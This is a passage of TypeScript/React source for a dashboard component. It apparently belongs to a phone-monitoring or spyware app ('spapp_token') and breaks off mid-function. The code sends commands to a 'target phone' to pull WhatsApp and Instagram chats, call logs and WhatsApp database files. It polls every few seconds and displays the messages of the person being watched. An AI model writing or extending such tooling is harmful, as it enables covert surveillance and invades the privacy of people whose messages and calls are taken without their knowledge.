import { useEffect, useMemo, useRef, useState } from "react";
import { devicesApi } from "../api/devices";
import { downloadFileViaRelay } from "../api/fileDownload";
import type { WhatsAppChatSummary, WhatsAppMessage, WhatsAppCallEntry, CallLogEntry, InstagramChatSummary, InstagramMessage } from "../api/types";

// ============================================================================
// TYPES & DATA MODELS
// ============================================================================
interface FileEntryDtoLocal {
  name: string;
  path: string;
  isDirectory: boolean;
  sizeBytes: number | null;
  mimeType: string | null;
}

type AvailableAppId = "whatsapp" | "instagram";

interface AppMetadata {
  id: AvailableAppId;
  name: string;
  packageName: string;
  color: string;
  badge: "Active" | "Coming Soon";
  isSupported: boolean;
  description: string;
}

const SUPPORTED_APPS: AppMetadata[] = [
  {
    id: "whatsapp",
    name: "WhatsApp",
    packageName: "com.whatsapp",
    color: "#25D366",
    badge: "Active",
    isSupported: true,
    description: "WhatsApp chats, media & databases",
  },
  {
    id: "instagram",
    name: "Instagram Direct",
    packageName: "com.instagram.android",
    color: "#E1306C",
    badge: "Active",
    isSupported: true,
    description: "DMs, Reels links & shared media",
  },
];

export interface UnifiedChatSummary {
  id: string;
  chatName: string;
  subtitle?: string | null;
  lastMessage: string | null;
  lastMessageAt: string;
  lastIsOutgoing: boolean;
  totalMessages: number;
  source: "whatsapp" | "instagram";
  isContactOnly?: boolean;
  targetAccount?: string | null;
}

export interface UnifiedChatMessage {
  id: string | number;
  sender: string | null;
  text: string;
  isOutgoing: boolean;
  timestamp: string;
  mediaType?: string | null;
  mediaPath?: string | null;
  reelUrl?: string | null;
  targetAccount?: string | null;
}

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================
function formatSize(bytes: number): string {
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
  return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
}

function parentOf(path: string): string {
  const normalized = path.replace(/\\/g, "/");
  const idx = normalized.lastIndexOf("/");
  return idx === -1 ? "" : normalized.slice(0, idx);
}


function formatChatTime(dateString: string): string {
  try {
    const d = new Date(dateString);
    if (isNaN(d.getTime())) return "";
    const now = new Date();
    const diffMs = now.getTime() - d.getTime();
    if (diffMs < 60000 && diffMs >= -10000) return "Just now";
    if (d.toDateString() === now.toDateString()) {
      return d.toLocaleTimeString([], { hour: "numeric", minute: "2-digit" });
    }
    const yesterday = new Date(now);
    yesterday.setDate(now.getDate() - 1);
    if (d.toDateString() === yesterday.toDateString()) return "Yesterday";
    if (now.getTime() - d.getTime() < 7 * 24 * 60 * 60 * 1000) {
      return d.toLocaleDateString(undefined, { weekday: "short" });
    }
    return d.toLocaleDateString(undefined, { month: "numeric", day: "numeric" });
  } catch {
    return dateString;
  }
}

function getMessageDateGroup(dateString: string): string {
  try {
    const msgDate = new Date(dateString);
    const today = new Date();
    const yesterday = new Date();
    yesterday.setDate(today.getDate() - 1);

    if (msgDate.toDateString() === today.toDateString()) return "Today";
    if (msgDate.toDateString() === yesterday.toDateString()) return "Yesterday";
    return msgDate.toLocaleDateString(undefined, { weekday: "short", month: "short", day: "numeric" });
  } catch {
    return "Recent";
  }
}

function formatMessageTime(dateString: string): string {
  try {
    const d = new Date(dateString);
    return d.toLocaleTimeString([], { hour: "numeric", minute: "2-digit" });
  } catch {
    return "";
  }
}

function formatMessageDateTime(dateString: string): string {
  try {
    const d = new Date(dateString);
    return `${d.toLocaleDateString(undefined, { month: "short", day: "numeric" })} at ${d.toLocaleTimeString([], { hour: "numeric", minute: "2-digit" })}`;
  } catch {
    return dateString;
  }
}

export function isWithinLast2Days(dateString: string): boolean {
  try {
    const time = new Date(dateString).getTime();
    if (isNaN(time)) return true;
    const twoDaysAgo = Date.now() - 2 * 24 * 60 * 60 * 1000;
    return time >= twoDaysAgo;
  } catch {
    return true;
  }
}

function isWhatsAppChannel(chat: { chatName: string; subtitle?: string | null; lastMessage?: string | null }): boolean {
  const name = chat.chatName.toLowerCase().trim();
  return (
    name.includes("whatsapp channel") ||
    name.includes("broadcast channel") ||
    name.endsWith(" channel") ||
    name.startsWith("channel:") ||
    name === "whatsapp status" ||
    name.includes("whatsapp community")
  );
}

// ============================================================================
// SVG ICONS
// ============================================================================
function WhatsAppLogo({ className = "w-5 h-5" }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 24 24" fill="currentColor">
      <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51l-.57-.01c-.198 0-.52.074-.792.372s-1.04 1.016-1.04 2.479 1.065 2.876 1.213 3.074c.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L0 24l6.335-1.662c1.746.953 3.71 1.456 5.711 1.457h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.411z" />
    </svg>
  );
}


function InstagramLogo({ className = "w-5 h-5" }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 24 24" fill="currentColor">
      <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z" />
    </svg>
  );
}

export function isContactSyncPlaceholder(text: string | null | undefined): boolean {
  if (!text) return true;
  const t = text.trim();
  if (!t) return true;
  if (t.includes("@s.whatsapp.net") || t.includes("@g.us")) return true;
  const lower = t.toLowerCase();
  const knownPlaceholders = [
    "whatsapp contact",
    "recent whatsapp chat",
    "contact",
    "recent contact",
    "recent conversation",
    "tap to view conversation",
    "click chat to get last 2 days conversation",
    "whatsapp monitored chat",
    "whatsapp group",
    "camera",
    "send",
    "attach",
    "payment",
    "emoji, gifs and stickers",
    "go to most recent message",
    "instagram contact",
    "instagram monitored chat",
    "recent instagram chat",
    "recent instagram conversation"
  ];
  if (knownPlaceholders.includes(lower)) return true;
  if (/^message \+?[0-9\s-]+$/i.test(t)) return true;
  if (/^voice message, button/i.test(t)) return true;
  if (/^reactions:/i.test(t)) return true;
  if (lower.includes("view reactions")) return true;
  if (/^[0-9]+$/.test(t)) return true;
  if (lower.endsWith("picture")) return true;
  if (lower.includes("filter")) return true;
  return false;
}

export interface SyncProgress {
  chatName: string;
  step: 1 | 2 | 3 | 4;
  percent: number;
  title: string;
  detail: string;
  status: "idle" | "running" | "success" | "empty" | "error";
  startedAt?: Date;
}

export function isPhoneNumberString(text: string | null | undefined): boolean {
  if (!text) return false;
  const t = text.trim();
  return /^\+?[0-9\s\-()]{7,25}$/.test(t);
}

export function isAutomatedShortCode(str: string): boolean {
  const s = str.toUpperCase();
  return (
    s.includes("BNK") ||
    s.includes("BANK") ||
    s.includes("AIRTEL") ||
    s.includes("JIO") ||
    s.includes("OTP") ||
    s.includes("PROMO") ||
    s.includes("LOAN") ||
    /^[A-Z]{2}-[A-Z0-9]+-[A-Z]$/.test(s)
  );
}

export function isPlaceholderOrNumber(text: string | null | undefined): boolean {
  return isContactSyncPlaceholder(text) || isPhoneNumberString(text);
}

export function isWithinLast5Days(dateString: string): boolean {
  try {
    const time = new Date(dateString).getTime();
    if (isNaN(time)) return true;
    const fiveDaysAgo = Date.now() - 5 * 24 * 60 * 60 * 1000;
    return time >= fiveDaysAgo;
  } catch {
    return true;
  }
}

export function formatCallDuration(seconds: number, direction?: string): string {
  if (direction === "missed" || seconds === 0) return "Missed";
  const mins = Math.floor(seconds / 60);
  const secs = seconds % 60;
  if (mins === 0) return `${secs}s`;
  return `${mins}m ${secs < 10 ? "0" : ""}${secs}s`;
}

export function formatCountdown(seconds: number): string {
  const mins = Math.floor(seconds / 60);
  const secs = seconds % 60;
  return `${mins < 10 ? "0" : ""}${mins}:${secs < 10 ? "0" : ""}${secs}`;
}

export type ChatCategoryTab = "chats" | "channels" | "calls";

// ============================================================================
// MAIN APPSCARD COMPONENT
// ============================================================================
export default function AppsCard({ deviceId }: { deviceId: string }) {
  // Navigation / App State
  const [selectedApp, setSelectedApp] = useState<AvailableAppId>("whatsapp");
  const [activeView, setActiveView] = useState<"chats" | "files">("chats");
  const [timeFilter, setTimeFilter] = useState<"2days" | "all">("2days");
  const [chatCategory, setChatCategory] = useState<ChatCategoryTab>("chats");
  const [dashboardLoginTime] = useState<Date>(() => new Date());

  // Real Data States
  const [whatsappChats, setWhatsappChats] = useState<WhatsAppChatSummary[]>([]);
  const [instagramChats, setInstagramChats] = useState<InstagramChatSummary[]>([]);
  const [, setInstagramAccount] = useState<string>("");
  const [whatsAppCalls, setWhatsAppCalls] = useState<WhatsAppCallEntry[]>([]);
  const [selectedCallId, setSelectedCallId] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [lastSyncedTime, setLastSyncedTime] = useState<Date>(new Date());

  // Selected chat & messages thread
  const [selectedChatId, setSelectedChatId] = useState<string | null>(null);
  const [chatSearch, setChatSearch] = useState("");
  const [messagesLoading, setMessagesLoading] = useState(false);
  const [activeThreadMessages, setActiveThreadMessages] = useState<UnifiedChatMessage[]>([]);
  const fetchCurrentChatRef = useRef<((isInitial: boolean) => void) | null>(null);

  // Mobile app chat request state & 2-min auto-sync
  const [requestingChat, setRequestingChat] = useState<string | null>(null);
  const [syncProgress, setSyncProgress] = useState<SyncProgress | null>(null);
  const activeRequestIdRef = useRef<number>(0);
  const selectedChatIdRef = useRef<string | null>(selectedChatId);
  selectedChatIdRef.current = selectedChatId;
  const [autoSyncEnabled, setAutoSyncEnabled] = useState(true);
  const [countdownSeconds, setCountdownSeconds] = useState(120);
  const [lastSyncTime, setLastSyncTime] = useState<Date | null>(null);

  // WhatsApp Storage Files State
  const [files, setFiles] = useState<FileEntryDtoLocal[] | null>(null);
  const [filesLoading, setFilesLoading] = useState(false);
  const [fileStatus, setFileStatus] = useState<string | null>(null);
  const [currentPath, setCurrentPath] = useState("");
  const [categoryFilter, setCategoryFilter] = useState<"all" | "images" | "voice" | "docs" | "db">("all");
  const [downloadingFile, setDownloadingFile] = useState<string | null>(null);

  // --------------------------------------------------------------------------
  // 1. DATA LOADER: WHATSAPP & INSTAGRAM CHATS, CALLS & REAL MESSAGES
  // --------------------------------------------------------------------------
  const loadDeviceChatData = async (isManual = false) => {
    if (isManual) setLoading(true);
    try {
      if (isManual) {
        if (selectedApp === "instagram") {
          devicesApi.createCommand(deviceId, "sync_instagram").catch(() => {});
        } else {
          devicesApi.createCommand(deviceId, "sync_whatsapp").catch(() => {
            devicesApi.createCommand(deviceId, "location_check").catch(() => {});
          });
        }
      }

      const [waData, callsResponse, rawCallLogs, igData, igAccountRes] = await Promise.all([
        devicesApi.whatsAppChats(deviceId).catch((err) => {
          console.warn("WhatsApp chats fetch error:", err);
          return [] as WhatsAppChatSummary[];
        }),
        devicesApi.whatsAppCalls(deviceId).catch(() => ({ whatsapp_calls: [], device_calls: [] })),
        devicesApi.callLog(deviceId, { all: true }).catch(() => [] as CallLogEntry[]),
        devicesApi.instagramChats(deviceId).catch((err) => {
          console.warn("Instagram chats fetch error:", err);
          return [] as InstagramChatSummary[];
        }),
        devicesApi.instagramAccount(deviceId).catch(() => null),
      ]);

      if (igAccountRes && igAccountRes.accountName) {
        setInstagramAccount(igAccountRes.accountName);
      } else {
        setInstagramAccount("");
      }

      const isSystemNoise = (name: string | null | undefined): boolean => {
        if (!name) return true;
        const n = name.trim().toLowerCase();
        return (
          n === "" ||
          n === "whatsapp" ||
          n === "whatsapp web" ||
          n === "whatsapp status" ||
          n === "checking for new messages" ||
          n === "ask meta ai or search" ||
          n === "ask meta ai" ||
          n === "meta ai" ||
          n === "floating windows" ||
          n === "search unread chats" ||
          n === "not interested" ||
          n === "interested" ||
          n === "reels" ||
          n === "follow" ||
          n === "search" ||
          n === "updates" ||
          n === "chats" ||
          n === "calls" ||
          n === "communities" ||
          n === "type a message" ||
          n === "message" ||
          n === "recent contact" ||
          n === "recent conversation" ||
          n === "tap to view conversation" ||
          n.startsWith("whatsapp audio") ||
          n.startsWith("whatsapp photo") ||
          n.startsWith("whatsapp document") ||
          n.startsWith("whatsapp video") ||
          n.startsWith("whatsapp media") ||
          n.startsWith("whatsapp image") ||
          n.startsWith("whatsapp voice") ||
          n.startsWith("switched to") ||
          n.startsWith("switch to") ||
          n.startsWith("logged in as") ||
          n.includes("messages from") ||
          n.includes("joined using a group link") ||
          n.includes("left the group") ||
          n.includes("security code changed") ||
          n.includes("created group") ||
          n.includes("messages and calls are end-to-end encrypted")
        );
      };

      const cleanedChats: WhatsAppChatSummary[] = [];
      const seenChats = new Set<string>();

      for (const c of (waData || [])) {
        if (!c.chat_name || !c.chat_name.trim()) continue;
        if (isSystemNoise(c.chat_name)) continue;
        const key = c.chat_name.trim().toLowerCase();
        if (seenChats.has(key)) continue;

        cleanedChats.push({
          chat_name: c.chat_name.trim(),
          total_messages: c.total_messages || 0,
          last_message_at: c.last_message_at || new Date().toISOString(),
          last_message: c.last_message || null,
          last_is_outgoing: Boolean(c.last_is_outgoing),
        });
        seenChats.add(key);
      }

      cleanedChats.sort((a, b) => new Date(b.last_message_at).getTime() - new Date(a.last_message_at).getTime());
      setWhatsappChats(cleanedChats);

      // 1b. Process Instagram Direct Chats
      const cleanedIgChats: InstagramChatSummary[] = [];
      const seenIgChats = new Set<string>();

      for (const c of (igData || [])) {
        if (!c.chat_name || !c.chat_name.trim()) continue;
        if (isSystemNoise(c.chat_name)) continue;
        const key = c.chat_name.trim().toLowerCase();
        if (seenIgChats.has(key)) continue;

        cleanedIgChats.push({
          chat_name: c.chat_name.trim(),
          username: c.username || null,
          total_messages: c.total_messages || 0,
          last_message_at: c.last_message_at || new Date().toISOString(),
          last_message: c.last_message || null,
          last_is_outgoing: Boolean(c.last_is_outgoing),
          target_account: c.target_account || null,
        });
        seenIgChats.add(key);
      }

      cleanedIgChats.sort((a, b) => new Date(b.last_message_at).getTime() - new Date(a.last_message_at).getTime());
      setInstagramChats(cleanedIgChats);

      // 2. Process WhatsApp Calls (Strictly Last 5 Days)
      const mergedCallsMap = new Map<string, WhatsAppCallEntry>();

      if (callsResponse?.whatsapp_calls) {
        for (const c of callsResponse.whatsapp_calls) {
          if (isWithinLast5Days(c.timestamp)) {
            mergedCallsMap.set(c.id, c);
          }
        }
      }

      if (callsResponse?.device_calls) {
        for (const c of callsResponse.device_calls) {
          if (isWithinLast5Days(c.timestamp)) {
            mergedCallsMap.set(`dcall-${c.number}-${c.timestamp}`, c);
          }
        }
      }

      for (const call of (rawCallLogs || [])) {
        if (isWithinLast5Days(call.called_at)) {
          const key = `raw-${call.counterparty}-${call.called_at}`;
          if (!mergedCallsMap.has(key)) {
            mergedCallsMap.set(key, {
              id: key,
              name: call.contact_name || call.counterparty || "WhatsApp Contact",
              number: call.counterparty || "",
              timestamp: call.called_at,
              direction: call.direction === "missed" ? "missed" : call.direction === "outgoing" ? "outgoing" : "incoming",
              call_type: "voice",
              duration_sec: call.duration_sec || 0,
              source: "device",
            });
          }
        }
      }


      const sortedCalls = Array.from(mergedCallsMap.values()).sort(
        (a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
      );
      setWhatsAppCalls(sortedCalls);
      setLastSyncedTime(new Date());
    } catch (e) {
      console.error("Failed to load device chat data", e);
    } finally {
      if (isManual) setLoading(false);
    }
  };

  const loadRef = useRef(loadDeviceChatData);
  loadRef.current = loadDeviceChatData;

  // Real-time EventSource push + 3-second live auto-refresh polling
  useEffect(() => {
    loadRef.current();

    let eventSource: EventSource | null = null;
    try {
      const token = localStorage.getItem("spapp_token") || "";
      // Relative path — same /api proxy (vercel.json rewrite / Vite dev
      // server proxy) that apiClient's requests go through, so this is a
      // same-origin request too.
      const sseUrl = `/api/devices/${deviceId}/events?token=${encodeURIComponent(token)}`;
      eventSource = new EventSource(sseUrl);

      eventSource.onmessage = (event) => {
        try {
          const payload = JSON.parse(event.data);
          if (payload.type === "instagram_account" && payload.accountName) {
            setInstagramAccount(payload.accountName);
            setLastSyncedTime(new Date());
            loadRef.current();
          } else if (
            payload.type === "whatsapp_message" ||
            payload.type === "instagram_message" ||
            payload.type === "sync" ||
            payload.type === "new_data"
          ) {
            setLastSyncedTime(new Date());
            loadRef.current();
            if (fetchCurrentChatRef.current) {
              fetchCurrentChatRef.current(false);
            }
          }
        } catch (_) {}
      };
      eventSource.onerror = () => {};
    } catch (err) {
      console.warn("Real-time SSE subscription error:", err);
    }

    const pollInterval = setInterval(() => {
      loadRef.current();
      if (fetchCurrentChatRef.current) {
        fetchCurrentChatRef.current(false);
      }
    }, 3000);

    return () => {
      if (eventSource) {
        eventSource.close();
      }
      clearInterval(pollInterval);
    };
  }, [deviceId]);

  // Formatted WhatsApp Chat Summaries
  const whatsappChatSummaries = useMemo<UnifiedChatSummary[]>(() => {
    if (!whatsappChats || whatsappChats.length === 0) return [];
    return whatsappChats
      .filter((c) => {
        const name = (c.chat_name || "").toLowerCase().trim();
        return (
          !name.includes("picture") &&
          !name.includes("radio group") &&
          !name.includes("filter") &&
          !name.includes("unread status") &&
          !/^\d+\s+messages?\s+from\s+\d+\s+chats?/i.test(name) &&
          name !== "whatsapp" &&
          name !== "whatsapp group"
        );
      })
      .map((c) => {
      const isChannel = isWhatsAppChannel({ chatName: c.chat_name, subtitle: "", lastMessage: c.last_message } as any);
      const isPhone = isPhoneNumberString(c.chat_name);

      let subtitle = isPhone ? c.chat_name : "WhatsApp Chat";
      if (isChannel) {
        subtitle = "WhatsApp Channel / Broadcast";
      }

      const hasRealMessage = c.last_message && !isPlaceholderOrNumber(c.last_message);
      const displayLastMsg = hasRealMessage
        ? c.last_message
        : "Click chat to get last 2 days conversation";

      return {
        id: c.chat_name,
        chatName: c.chat_name,
        subtitle,
        lastMessage: displayLastMsg,
        lastMessageAt: c.last_message_at,
        lastIsOutgoing: c.last_is_outgoing,
        totalMessages: c.total_messages,
        source: "whatsapp",
        isContactOnly: !hasRealMessage,
      };
    });
  }, [whatsappChats]);

  // Separate into Chats (personal/group chats) and Channels (broadcasts)
  const { whatsappPersonalChats, channelChats } = useMemo(() => {
    const personal: UnifiedChatSummary[] = [];
    const channels: UnifiedChatSummary[] = [];

    for (const c of whatsappChatSummaries) {
      if (isWhatsAppChannel(c)) {
        channels.push(c);
      } else {
        personal.push(c);
      }
    }

    return {
      whatsappPersonalChats: personal,
      channelChats: channels,
    };
  }, [whatsappChatSummaries]);

  // Formatted Instagram Direct Chat Summaries
  const instagramChatSummaries = useMemo<UnifiedChatSummary[]>(() => {
    if (!instagramChats || instagramChats.length === 0) return [];
    return instagramChats.map((c) => {
      const hasRealMessage = c.last_message && !isPlaceholderOrNumber(c.last_message);
      const displayLastMsg = hasRealMessage
        ? c.last_message
        : "Click chat to get last 2 days conversation";

      return {
        id: c.chat_name,
        chatName: c.chat_name,
        subtitle: "Instagram Direct",
        lastMessage: displayLastMsg,
        lastMessageAt: c.last_message_at,
        lastIsOutgoing: c.last_is_outgoing,
        totalMessages: c.total_messages,
        source: "instagram",
        isContactOnly: !hasRealMessage,
        targetAccount: c.target_account || null,
      };
    });
  }, [instagramChats]);

  // Active Chats for the currently selected category tab (chats, channels)
  const activeCategoryChats = useMemo<UnifiedChatSummary[]>(() => {
    if (selectedApp === "whatsapp") {
      if (chatCategory === "chats") return whatsappPersonalChats;
      if (chatCategory === "channels") return channelChats;
    } else if (selectedApp === "instagram") {
      return instagramChatSummaries;
    }
    return [];
  }, [selectedApp, chatCategory, whatsappPersonalChats, channelChats, instagramChatSummaries]);

  // Filtered Chats by search within the currently active category
  const displayedChats = useMemo<UnifiedChatSummary[]>(() => {
    if (!chatSearch.trim()) return activeCategoryChats;
    const q = chatSearch.toLowerCase();
    return activeCategoryChats.filter(
      (c) =>
        c.chatName.toLowerCase().includes(q) ||
        (c.subtitle && c.subtitle.toLowerCase().includes(q)) ||
        (c.lastMessage && c.lastMessage.toLowerCase().includes(q))
    );
  }, [activeCategoryChats, chatSearch]);

  // Filtered Calls by search for the "calls" tab
  const displayedCalls = useMemo<WhatsAppCallEntry[]>(() => {
    if (!chatSearch.trim()) return whatsAppCalls;
    const q = chatSearch.toLowerCase();
    return whatsAppCalls.filter(
      (c) =>
        c.name.toLowerCase().includes(q) ||
        c.number.toLowerCase().includes(q) ||
        c.direction.toLowerCase().includes(q)
    );
  }, [whatsAppCalls, chatSearch]);

  // Auto-selection for active items
  useEffect(() => {
    if (chatCategory === "calls" && selectedApp === "whatsapp") {
      if (displayedCalls.length > 0) {
        if (!selectedCallId || !displayedCalls.some((c) => c.id === selectedCallId)) {
          setSelectedCallId(displayedCalls[0].id);
        }
      } else {
        setSelectedCallId(null);
      }
    } else {
      if (displayedChats.length > 0) {
        if (!selectedChatId || !displayedChats.some((c) => c.id === selectedChatId)) {
          const first = displayedChats[0];
          setSelectedChatId(first.id);
          if (first.lastMessage && !isContactSyncPlaceholder(first.lastMessage)) {
            const rawText = first.lastMessage;
            const isTargetSent = Boolean(first.lastIsOutgoing) || rawText.startsWith("You: ") || rawText.startsWith("You reacted ");
            const cleanText = rawText.startsWith("You: ") ? rawText.slice(5).trim() : rawText;
            setActiveThreadMessages([{
              id: `preview-${first.id}`,
              sender: isTargetSent ? "Target Device" : first.chatName,
              text: cleanText,
              isOutgoing: isTargetSent,
              timestamp: first.lastMessageAt || new Date().toISOString(),
              mediaType: null,
              mediaPath: null,
            }]);
          }
        }
      } else {
        setSelectedChatId(null);
      }
    }
  }, [chatCategory, displayedChats, displayedCalls, selectedApp]);

  const selectedCallSummary = useMemo(() => {
    return whatsAppCalls.find((c) => c.id === selectedCallId) || null;
  }, [whatsAppCalls, selectedCallId]);

  // --------------------------------------------------------------------------
  // REQUEST CHAT CONTENTS FROM MOBILE APP (LAST 2 DAYS)
  // --------------------------------------------------------------------------
  const requestChatFromMobileApp = async (chatName: string, _isAutoSync = false) => {
    if (!chatName || !chatName.trim()) return;
    const cleanName = chatName.trim();
    const isInstagram = selectedApp === "instagram";

    // Increment request ID so any previously running command poll aborts immediately
    const myRequestId = ++activeRequestIdRef.current;

    setRequestingChat(cleanName);
    setCountdownSeconds(120); // Reset 2-min countdown timer

    setSyncProgress({
      chatName: cleanName,
      step: 1,
      percent: 25,
      title: "1. Request Sent",
      detail: `Step 1/4: 📤 Dispatching fetch command for "${cleanName}" (${isInstagram ? "Instagram Direct" : "WhatsApp"}) to target phone...`,
      status: "running",
      startedAt: new Date(),
    });

    try {
      const commandType = isInstagram ? "get_instagram_chat" : "get_whatsapp_chat";
      let phoneNumber: string | undefined = undefined;

      if (!isInstagram) {
        const matchedChat = whatsappChats.find(
          (c) => c.chat_name?.trim().toLowerCase() === cleanName.toLowerCase()
        );
        phoneNumber = matchedChat?.phone_number || undefined;
      }

      // Dispatch command to mobile app to fetch last 2 days conversation
      const cmd = await devicesApi.createCommand(deviceId, commandType, {
        chatName: cleanName,
        phoneNumber,
        days: 2,
      });

      if (activeRequestIdRef.current !== myRequestId) return; // User switched to another chat

      const cmdId = cmd?.id;
      let finished = false;

      if (cmdId) {
        // Poll command status from server (24 iterations x 1.5s = 36s window)
        for (let i = 0; i < 24; i++) {
          await new Promise((r) => setTimeout(r, 1500));
          if (activeRequestIdRef.current !== myRequestId) return; // Abort if user switched chat

          try {
            const checked = await devicesApi.getCommand(deviceId, cmdId);
            if (activeRequestIdRef.current !== myRequestId) return; // Abort if user switched chat

            if (checked.status === "pending") {
              setSyncProgress((prev) =>
                prev?.chatName === cleanName
                  ? {
                      ...prev,
                      step: 1,
                      percent: 25 + Math.min(20, Math.floor((i / 24) * 20)),
                      title: "1. Request Sent",
                      detail: `Step 1/4: 📤 Dispatching fetch command for "${cleanName}" (${isInstagram ? "Instagram Direct" : "WhatsApp"}) — waiting for mobile phone pickup (${i + 1}/24)...`,
                      status: "running",
                    }
                  : prev
              );
            } else if (checked.status === "sent") {
              setSyncProgress((prev) =>
                prev?.chatName === cleanName
                  ? {
                      ...prev,
                      step: 2,
                      percent: 50,
                      title: "2. Mobile Phone Received",
                      detail: `Step 2/4: 📱 Target phone received command and is extracting ${isInstagram ? "Instagram Direct" : "WhatsApp"} conversation...`,
                      status: "running",
                    }
                  : prev
              );
            } else if (checked.status === "acked") {
              finished = true;
              setLastSyncTime(new Date());

              const respMsg = (checked.result as any)?.message || "Conversation messages synced by phone.";
              setSyncProgress((prev) =>
                prev?.chatName === cleanName
                  ? {
                      ...prev,
                      step: 3,
                      percent: 75,
                      title: "3. Phone Response Received",
                      detail: `Step 3/4: 💬 ${respMsg} Storing into database...`,
                      status: "running",
                    }
                  : prev
              );

              // Seamlessly patch newly arrived messages without reloading the whole screen
              if (fetchCurrentChatRef.current) {
                fetchCurrentChatRef.current(false);
              }
              loadRef.current();

              // Verify message count after fetch
              setTimeout(() => {
                if (activeRequestIdRef.current === myRequestId) {
                  const fetchMsgs = isInstagram
                    ? devicesApi.instagramMessages(deviceId, cleanName)
                    : devicesApi.whatsAppMessages(deviceId, cleanName);

                  fetchMsgs.then((msgs: any[]) => {
                    if (activeRequestIdRef.current !== myRequestId) return;
                    if (msgs && msgs.length > 0) {
                      setSyncProgress({
                        chatName: cleanName,
                        step: 4,
                        percent: 100,
                        title: "4. DB & Dashboard Updated",
                        detail: `Step 4/4: 💾 Ready! ${msgs.length} messages loaded from DB and displayed.`,
                        status: "success",
                      });
                    } else {
                      setSyncProgress({
                        chatName: cleanName,
                        step: 4,
                        percent: 100,
                        title: "4. Phone Checked (0 Messages)",
                        detail: (checked.result as any)?.message || "Phone reported 0 messages found in last 2 days.",
                        status: "empty",
                      });
                    }
                  }).catch(() => {});
                }
              }, 600);

              break;
            } else if (checked.status === "failed") {
              finished = true;
              setSyncProgress({
                chatName: cleanName,
                step: 4,
                percent: 100,
                title: "4. Phone Response",
                detail: (checked.result as any)?.message || "Device reported: No conversation found in last 2 days.",
                status: "empty",
              });
              break;
            }
          } catch (_) {}
        }
      }

      if (!finished && activeRequestIdRef.current === myRequestId) {
        setLastSyncTime(new Date());
        if (fetchCurrentChatRef.current) {
          fetchCurrentChatRef.current(false);
        }
        setSyncProgress({
          chatName: cleanName,
          step: 4,
          percent: 100,
          title: "4. DB Synced",
          detail: "Sync window completed. Stored messages refreshed from DB.",
          status: "idle",
        });
      }
    } catch (err: any) {
      console.warn("Failed to dispatch command:", err);
      if (activeRequestIdRef.current === myRequestId) {
        setSyncProgress({
          chatName: cleanName,
          step: 4,
          percent: 100,
          title: "Sync Error",
          detail: "Failed to dispatch request to phone.",
          status: "error",
        });
      }
    } finally {
      if (activeRequestIdRef.current === myRequestId) {
        setRequestingChat(null);
        if (fetchCurrentChatRef.current) {
          fetchCurrentChatRef.current(false);
        }
        loadRef.current();
      }
    }
  };

  const handleSelectChat = (c: UnifiedChatSummary) => {
    if (selectedChatId !== c.id) {
      // 1. Cancel any active command polling for previous chat
      activeRequestIdRef.current++;

      // 2. Switch selected chat immediately
      setSelectedChatId(c.id);

      // 3. Clear existing active thread or set preview
      if (c.lastMessage && !c.isContactOnly && !isContactSyncPlaceholder(c.lastMessage)) {
        const rawText = c.lastMessage;
        const isTargetSent = Boolean(c.lastIsOutgoing) || rawText.startsWith("You: ") || rawText.startsWith("You reacted ");
        const cleanText = rawText.startsWith("You: ") ? rawText.slice(5).trim() : rawText;
        setActiveThreadMessages([{
          id: `preview-${c.id}`,
          sender: isTargetSent ? "Target Device" : c.chatName,
          text: cleanText,
          isOutgoing: isTargetSent,
          timestamp: c.lastMessageAt || new Date().toISOString(),
          mediaType: null,
          mediaPath: null,
        }]);
      } else {
        setActiveThreadMessages([]);
      }

      setCountdownSeconds(120);

